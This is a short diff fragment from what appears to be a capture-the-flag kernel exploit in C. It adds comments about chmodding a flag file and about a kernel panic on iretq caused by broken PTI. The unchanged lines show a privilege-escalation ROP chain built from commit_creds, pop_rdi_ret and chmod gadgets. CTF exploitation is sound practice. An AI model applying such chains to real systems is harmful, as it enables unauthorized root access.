@@ -414,6 +414,9 @@ void _start() {
   mmapedd[idx++] = commit_creds;
 
   // Chmod flag
+  // Big yeet by theKidOfArcania to chmod the flag
+  // and make the kernel sleep because it was panicking
+  // on the iretq due to broken PTI
   mmapedd[idx++] = pop_rdi_ret;
   mmapedd[idx++] = fuck;
   mmapedd[idx++] = chmod;
